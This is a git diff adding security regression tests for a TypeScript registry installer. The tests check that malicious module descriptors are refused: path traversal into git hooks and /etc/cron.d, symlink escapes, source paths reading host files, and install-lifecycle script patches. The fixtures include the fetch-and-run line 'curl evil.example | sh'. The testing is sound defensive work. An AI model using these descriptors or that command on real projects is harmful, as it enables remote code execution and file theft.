@@ -5,6 +5,9 @@ import {
   readFile,
   readlink,
   rm,
+  stat,
+  symlink,
+  utimes,
   writeFile,
 } from "node:fs/promises";
 import { tmpdir } from "node:os";
@@ -1302,5 +1305,599 @@ describe("registry-item schema — config patches", () => {
       patches: {},
     });
     expect(result.valid).toBeFalsy();
+  });
+});
+
+// #98 Phase 1. `add` is the one engine that consumes an untrusted remote descriptor, and
+// it was the one engine without the guards `remover.ts` and `updater.ts` already use.
+// These tests drive the two holes the 2026-08-30 audit named: a `..` target that escapes
+// the project root, and a symlinked path component that carries an in-root write outside
+// it. Each asserts the refusal, not the happy path.
+
+// A malicious third-party descriptor: an ordinary-looking feature whose one file target
+// climbs out of the alias prefix and lands on a git hook.
+async function traversalModule(): Promise<LoadedModule> {
+  return writeModule(
+    "evil",
+    {
+      type: "saasaloy:feature",
+      files: [
+        {
+          path: "files/hook.sh",
+          target: "@web/../../../.git/hooks/pre-commit",
+        },
+      ],
+    },
+    { "files/hook.sh": "#!/bin/sh\ncurl evil.example | sh\n" }
+  );
+}
+
+describe("buildPlan — write-path containment (#98)", () => {
+  it("refuses a files[] target that climbs out of the project root", async () => {
+    await expect(
+      plan({
+        install: ["evil"],
+        modules: [await traversalModule()],
+        config: { aliases: { "@web": "apps/web/src" }, installed: [] },
+      })
+    ).rejects.toThrow(/escapes the project root|'\.' or '\.\.' segments/);
+  });
+
+  it("refuses a scaffold target that climbs out of its workspace and the root", async () => {
+    const mod = await writeModule(
+      "evil",
+      {
+        type: "saasaloy:capability",
+        scaffolds: [
+          {
+            workspace: "apps/api",
+            files: [{ path: "files/x.ts", target: "../../../outside.ts" }],
+          },
+        ],
+      },
+      { "files/x.ts": "export {};\n" }
+    );
+    await expect(plan({ install: ["evil"], modules: [mod] })).rejects.toThrow(
+      /Refusing to resolve/
+    );
+  });
+
+  it("refuses a patches[] file outside the project root", async () => {
+    const mod = await writeModule("evil", {
+      type: "saasaloy:feature",
+      patches: [
+        {
+          file: "../../.git/hooks/pre-commit",
+          kind: "package-json-script",
+          name: "db:generate",
+          value: "drizzle-kit generate",
+        },
+      ],
+    });
+    await expect(plan({ install: ["evil"], modules: [mod] })).rejects.toThrow(
+      /Refusing to resolve/
+    );
+  });
+
+  it("refuses an absolute files[] target", async () => {
+    const mod = await writeModule(
+      "evil",
+      {
+        type: "saasaloy:feature",
+        files: [{ path: "files/x.ts", target: "@web//etc/cron.d/evil" }],
+      },
+      { "files/x.ts": "export {};\n" }
+    );
+    await expect(
+      plan({
+        install: ["evil"],
+        modules: [mod],
+        config: { aliases: { "@web": "" }, installed: [] },
+      })
+    ).rejects.toThrow(/Refusing to resolve/);
+  });
+
+  it("still resolves an ordinary alias-prefixed target", async () => {
+    const mod = await writeModule(
+      "waitlist",
+      {
+        type: "saasaloy:feature",
+        files: [{ path: "files/x.ts", target: "@api/routes/waitlist.ts" }],
+      },
+      { "files/x.ts": "export {};\n" }
+    );
+    const p = await plan({
+      install: ["waitlist"],
+      modules: [mod],
+      config: { aliases: { "@api": "apps/api/src" }, installed: [] },
+    });
+    expect(p.files[0]?.targetAbs).toBe(
+      join(resolve(root), "apps", "api", "src", "routes", "waitlist.ts")
+    );
+  });
+});
+
+describe("executePlan — symlink refusal (#98)", () => {
+  let outside: string;
+
+  beforeEach(async () => {
+    outside = await mkdtemp(join(tmpdir(), "saasaloy-outside-"));
+  });
+
+  afterEach(async () => {
+    await rm(outside, { recursive: true, force: true });
+  });
+
+  it("refuses to write a module file through a symlinked directory component", async () => {
+    // `apps` is a link out of the project, so the lexically-in-root write would land outside.
+    await symlink(outside, join(root, "apps"), "dir");
+    const config = emptyConfig();
+    const manifest = emptyManifest();
+    const p = await plan({
+      install: ["api"],
+      modules: [await apiWorkspace()],
+      config,
+      manifest,
+    });
+
+    await expect(executePlan(p, root, config, manifest)).rejects.toThrow(
+      /is a symlink/
+    );
+    await expect(
+      pathExists(join(outside, "api", "package.json"))
+    ).resolves.toBeFalsy();
+  });
+
+  it("refuses to patch a file reached through a symlinked directory component", async () => {
+    await mkdir(join(outside, "api"), { recursive: true });
+    await writeFile(
+      join(outside, "api", "package.json"),
+      '{\n  "name": "@app/api"\n}\n',
+      "utf-8"
+    );
+    await symlink(outside, join(root, "apps"), "dir");
+
+    const config = emptyConfig();
+    const manifest = emptyManifest();
+    const p = await plan({
+      install: ["database"],
+      modules: [await dbWithScript()],
+      config,
+      manifest,
+    });
+    expect(p.patches[0]?.action).toBe("apply");
+
+    await expect(executePlan(p, root, config, manifest)).rejects.toThrow(
+      /is a symlink/
+    );
+    await expect(
+      readFile(join(outside, "api", "package.json"), "utf-8")
+    ).resolves.not.toContain("db:generate");
+  });
+
+  it("refuses to create a skill link through a symlinked directory component", async () => {
+    await symlink(outside, join(root, ".claude"), "dir");
+    const config = emptyConfig();
+    const manifest = emptyManifest();
+    const p = await plan({
+      install: ["api"],
+      modules: [await skillModule()],
+      config,
+      manifest,
+    });
+
+    await expect(executePlan(p, root, config, manifest)).rejects.toThrow(
+      /is a symlink/
+    );
+    await expect(pathExists(join(outside, "skills"))).resolves.toBeFalsy();
+  });
+
+  it("leaves the idempotent re-add of an existing skill link working", async () => {
+    const config = emptyConfig();
+    const manifest = emptyManifest();
+    const mod = await skillModule();
+    await executePlan(
+      await plan({ install: ["api"], modules: [mod], config, manifest }),
+      root,
+      config,
+      manifest
+    );
+    const second = await plan({
+      install: ["api"],
+      modules: [mod],
+      config,
+      manifest,
+    });
+    expect(second.links[0]?.action).toBe("exists");
+    // The link we made ourselves must not trip the symlink guard on a re-add.
+    const result = await executePlan(second, root, config, manifest);
+    expect(result.links).toHaveLength(1);
+    expect(
+      (await lstat(join(root, ".claude/skills/saasaloy-api"))).isSymbolicLink()
+    ).toBeTruthy();
+  });
+});
+
+describe("registry-item schema — traversal-proof paths (#98)", () => {
+  const traversalItem = {
+    name: "evil",
+    type: "saasaloy:feature" as const,
+    files: [
+      { path: "files/hook.sh", target: "@web/../../../.git/hooks/pre-commit" },
+    ],
+  };
+
+  it("rejects the malicious descriptor outright", async () => {
+    const result = await validateRegistryItem(traversalItem);
+    expect(result.valid).toBeFalsy();
+    expect(result.errors.join("\n")).toContain("target");
+  });
+
+  it("rejects a '.' segment in a files[] target", async () => {
+    const result = await validateRegistryItem({
+      name: "evil",
+      type: "saasaloy:feature",
+      files: [{ path: "files/x.ts", target: "@api/./x.ts" }],
+    });
+    expect(result.valid).toBeFalsy();
+  });
+
+  it("rejects a trailing '..' segment in a files[] target", async () => {
+    const result = await validateRegistryItem({
+      name: "evil",
+      type: "saasaloy:feature",
+      files: [{ path: "files/x.ts", target: "@api/routes/.." }],
+    });
+    expect(result.valid).toBeFalsy();
+  });
+
+  it("rejects a '..' segment in a scaffold target", async () => {
+    const result = await validateRegistryItem({
+      name: "evil",
+      type: "saasaloy:capability",
+      scaffolds: [
+        {
+          workspace: "apps/api",
+          files: [{ path: "files/x.ts", target: "../../outside.ts" }],
+        },
+      ],
+    });
+    expect(result.valid).toBeFalsy();
+  });
+
+  it("rejects a '..' segment in a patches[] file", async () => {
+    const result = await validateRegistryItem({
+      name: "evil",
+      type: "saasaloy:feature",
+      patches: [
+        {
+          file: "apps/../../.git/hooks/pre-commit",
+          kind: "package-json-script",
+          name: "db:generate",
+          value: "drizzle-kit generate",
+        },
+      ],
+    });
+    expect(result.valid).toBeFalsy();
+  });
+
+  it("still accepts a dot-leading file name, which is not a dot segment", async () => {
+    const result = await validateRegistryItem({
+      name: "api",
+      type: "saasaloy:capability",
+      files: [{ path: "files/gitignore", target: "@api/.gitignore" }],
+      scaffolds: [
+        {
+          workspace: "apps/api",
+          files: [{ path: "files/dev.vars", target: ".dev.vars.example" }],
+        },
+      ],
+      patches: [
+        {
+          file: "apps/api/.eslintrc.json",
+          kind: "package-json-script",
+          name: "db:generate",
+          value: "drizzle-kit generate",
+        },
+      ],
+    });
+    expect(result.errors).toStrictEqual([]);
+    expect(result.valid).toBeTruthy();
+  });
+});
+
+describe("applier — install-lifecycle script refusal (#98)", () => {
+  // A descriptor that would earn arbitrary code execution on the victim's next install.
+  async function lifecycleModule(name: string): Promise<LoadedModule> {
+    return writeModule("evil", {
+      type: "saasaloy:feature",
+      dependsOn: ["api"],
+      patches: [
+        {
+          file: "apps/api/package.json",
+          kind: "package-json-script",
+          name,
+          value: "curl evil.example | sh",
+        },
+      ],
+    });
+  }
+
+  it.each([
+    "preinstall",
+    "install",
+    "postinstall",
+    "prepare",
+    "prepublish",
+    "prepublishOnly",
+  ])("refuses a %s patch and writes nothing", async (name) => {
+    const config = emptyConfig();
+    const manifest = emptyManifest();
+    const p = await plan({
+      install: ["api", "evil"],
+      modules: [await apiWorkspace(), await lifecycleModule(name)],
+      config,
+      manifest,
+    });
+    expect(p.patches[0]?.action).toBe("unchanged");
+
+    const result = await executePlan(p, root, config, manifest);
+
+    expect(result.patched).toStrictEqual([]);
+    expect(result.patchRefusals).toHaveLength(1);
+    expect(result.patchRefusals[0]?.reason).toContain(name);
+    const pkg = JSON.parse(
+      await readFile(join(root, "apps", "api", "package.json"), "utf-8")
+    ) as { scripts: Record<string, string> };
+    expect(pkg.scripts).toStrictEqual({ dev: "wrangler dev" });
+    // Nothing refused is tracked, so `remove` never claims to own the file.
+    expect(manifest.patches).toStrictEqual([]);
+  });
+
+  it("still applies an ordinary script whose name merely starts with a lifecycle word", async () => {
+    const config = emptyConfig();
+    const manifest = emptyManifest();
+    const p = await plan({
+      install: ["api", "evil"],
+      modules: [await apiWorkspace(), await lifecycleModule("installer:check")],
+      config,
+      manifest,
+    });
+    const result = await executePlan(p, root, config, manifest);
+    expect(result.patched).toHaveLength(1);
+  });
+});
+
+// #98 Phase 4. `add` was the one engine that trusted its own plan at write time: it
+// rewrote a file it had already classified `unchanged`, and it never re-read a target
+// between the confirmation prompt and the write. `remover.ts` and `updater.ts` both
+// re-check. These drive the two rules through the real buildPlan/executePlan pair.
+
+describe("executePlan — byte-identical files (#98)", () => {
+  // A far-past mtime survives a run that writes nothing and is replaced by one that
+  // writes, which is a sharper probe than comparing two timestamps taken seconds apart.
+  const STAMP = new Date("2001-01-01T00:00:00Z");
+
+  it("refreshes an unchanged file's manifest entry without rewriting it", async () => {
+    const config = emptyConfig();
+    const manifest = emptyManifest();
+    const mods = [await apiCapability()];
+    await executePlan(
+      await plan({ install: ["api"], modules: mods, config, manifest }),
+      root,
+      config,
+      manifest
+    );
+
+    const abs = join(root, "apps", "api", "src", "index.ts");
+    await utimes(abs, STAMP, STAMP);
+    // Drop the recorded `from` so the re-add has something to refresh: this is the
+    // manifest an install predating that field leaves behind.
+    const entry = manifest.managed["apps/api/src/index.ts"];
+    if (entry) {
+      delete entry.from;
+    }
+
+    const second = await plan({
+      install: ["api"],
+      modules: mods,
+      config,
+      manifest,
+    });
+    expect(second.files.every((f) => f.action === "unchanged")).toBeTruthy();
+
+    const result = await executePlan(second, root, config, manifest);
+
+    expect(result.written).toStrictEqual([]);
+    expect(result.refreshed.map((f) => f.target)).toContain(
+      "apps/api/src/index.ts"
+    );
+    expect((await stat(abs)).mtime.getTime()).toBe(STAMP.getTime());
+    expect(manifest.managed["apps/api/src/index.ts"]).toMatchObject({
+      module: "api",
+      from: "files/src/index.ts",
+    });
+  });
+
+  it("still writes a file whose content differs", async () => {
+    const config = emptyConfig();
+    const manifest = emptyManifest();
+    const p = await plan({
+      install: ["api"],
+      modules: [await apiCapability()],
+      config,
+      manifest,
+    });
+    const result = await executePlan(p, root, config, manifest);
+    expect(result.written).toHaveLength(2);
+    expect(result.refreshed).toStrictEqual([]);
+  });
+});
+
+describe("executePlan — plan-to-execute re-check (#98)", () => {
+  it("leaves a planned `create` alone when something appeared at its path", async () => {
+    const config = emptyConfig();
+    const manifest = emptyManifest();
+    const p = await plan({
+      install: ["api"],
+      modules: [await apiCapability()],
+      config,
+      manifest,
+    });
+
+    // The confirmation prompt is open for as long as the user takes; anything can land
+    // in the gap. These bytes were never offered for overwrite.
+    const abs = join(root, "apps", "api", "src", "index.ts");
+    await mkdir(dirname(abs), { recursive: true });
+    await writeFile(abs, "// mine\n", "utf-8");
+
+    const result = await executePlan(p, root, config, manifest);
+
+    await expect(readFile(abs, "utf-8")).resolves.toBe("// mine\n");
+    expect(result.lateDrift.map((f) => f.target)).toStrictEqual([
+      "apps/api/src/index.ts",
+    ]);
+    expect(result.written.map((f) => f.target)).toStrictEqual([
+      "apps/api/package.json",
+    ]);
+    expect(manifest.managed["apps/api/src/index.ts"]).toBeUndefined();
+  });
+
+  it("leaves a planned `overwrite` alone when the file was edited under it", async () => {
+    const config = emptyConfig();
+    const manifest = emptyManifest();
+    const mods = [await apiCapability()];
+    await executePlan(
+      await plan({ install: ["api"], modules: mods, config, manifest }),
+      root,
+      config,
+      manifest
+    );
+
+    // Re-plan against an edited copy of what we wrote: hash still matches the manifest
+    // at plan time, so the plan says `overwrite` — then the user saves again.
+    const abs = join(root, "apps", "api", "src", "index.ts");
+    const planned = await plan({
+      install: ["api"],
+      modules: mods,
+      config,
+      manifest,
+    });
+    const file = planned.files.find(
+      (f) => f.target === "apps/api/src/index.ts"
+    );
+    expect(file?.action).toBe("unchanged");
+    await writeFile(abs, "// edited while the prompt was up\n", "utf-8");
+
+    const result = await executePlan(planned, root, config, manifest);
+
+    await expect(readFile(abs, "utf-8")).resolves.toBe(
+      "// edited while the prompt was up\n"
+    );
+    expect(result.lateDrift.map((f) => f.target)).toStrictEqual([
+      "apps/api/src/index.ts",
+    ]);
+    expect(result.written).toStrictEqual([]);
+  });
+});
+
+// #98 fix round. Two modules in one run can ship the same target: `database` and its
+// driver `database-d1` both scaffold `packages/db/tsconfig.json`. Planned twice they
+// both classified `create`, the core's copy landed first, and `stillMatches` then read
+// this run's own bytes and dropped the driver's copy as late drift — so `packages/db`
+// kept the core tsconfig and lost the `types` entry the driver needs.
+describe("a target two modules in one run both ship", () => {
+  it("lands the last planner's copy, not the first's", async () => {
+    const core = await writeModule(
+      "database",
+      {
+        type: "saasaloy:capability",
+        scaffolds: [
+          {
+            workspace: "packages/db",
+            aliases: { "@db": "packages/db/src" },
+            files: [{ path: "files/tsconfig.json", target: "tsconfig.json" }],
+          },
+        ],
+      },
+      { "files/tsconfig.json": '{ "types": ["vite/client"] }\n' }
+    );
+    const driver = await writeModule(
+      "database-d1",
+      {
+        type: "saasaloy:capability",
+        dependsOn: ["database"],
+        scaffolds: [
+          {
+            workspace: "packages/db",
+            files: [{ path: "files/tsconfig.json", target: "tsconfig.json" }],
+          },
+        ],
+      },
+      {
+        "files/tsconfig.json":
+          '{ "types": ["@cloudflare/workers-types", "vite/client"] }\n',
+      }
+    );
+
+    const config = emptyConfig();
+    const manifest = emptyManifest();
+    // Topological order: the driver dependsOn the core, so it plans second.
+    const planned = await plan({
+      install: ["database", "database-d1"],
+      modules: [core, driver],
+      config,
+      manifest,
+    });
+
+    const entries = planned.files.filter(
+      (f) => f.target === "packages/db/tsconfig.json"
+    );
+    expect(entries).toHaveLength(1);
+    expect(entries[0]?.module).toBe("database-d1");
+
+    const result = await executePlan(planned, root, config, manifest);
+
+    expect(result.lateDrift).toStrictEqual([]);
+    await expect(
+      readFile(join(root, "packages", "db", "tsconfig.json"), "utf-8")
+    ).resolves.toBe(
+      '{ "types": ["@cloudflare/workers-types", "vite/client"] }\n'
+    );
+    expect(manifest.managed["packages/db/tsconfig.json"]?.module).toBe(
+      "database-d1"
+    );
+  });
+});
+
+// #98 fix round. Phase 1 guarded every write target and left the read side on a bare
+// `join`, which normalizes a `..` away. A third-party descriptor could therefore name a
+// source outside its own module folder and copy a host file into the project.
+describe("a descriptor source path that escapes the module folder", () => {
+  it("is refused before anything is read", async () => {
+    const secret = join(moduleRoot, "secret.txt");
+    await writeFile(secret, "not yours\n", "utf-8");
+    const mod = await writeModule("hostile", {
+      type: "saasaloy:feature",
+      files: [{ path: "../secret.txt", target: "@api/stolen.txt" }],
+    });
+
+    await expect(
+      plan({
+        install: ["hostile"],
+        modules: [mod],
+        config: { aliases: { "@api": "apps/api/src" }, installed: [] },
+      })
+    ).rejects.toThrow(/inside the module folder/);
+  });
+
+  it("fails the descriptor at authoring time too", async () => {
+    await expect(
+      validateRegistryItem({
+        name: "hostile",
+        type: "saasaloy:feature",
+        files: [{ path: "../secret.txt", target: "@api/stolen.txt" }],
+      })
+    ).resolves.toMatchObject({ valid: false });
   });
 });
